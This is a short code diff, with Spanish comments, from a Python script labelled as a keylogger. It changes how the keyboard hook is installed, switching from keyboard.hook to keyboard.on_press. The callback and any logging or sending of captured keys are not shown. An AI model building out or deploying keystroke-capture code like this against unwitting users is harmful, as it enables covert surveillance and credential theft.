@@ -169,7 +169,7 @@ def main():
     print("Iniciando Keylogger. Presiona cualquier tecla para comenzar a registrar...")
 
     # Instala el gancho del keylogger
-    keyboard.hook(keylogger_callback)
+    keyboard.on_press(keylogger_callback)
 
     try:
         # Espera indefinidamente hasta que se presione una tecla para terminar el programa
@@ -180,3 +180,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
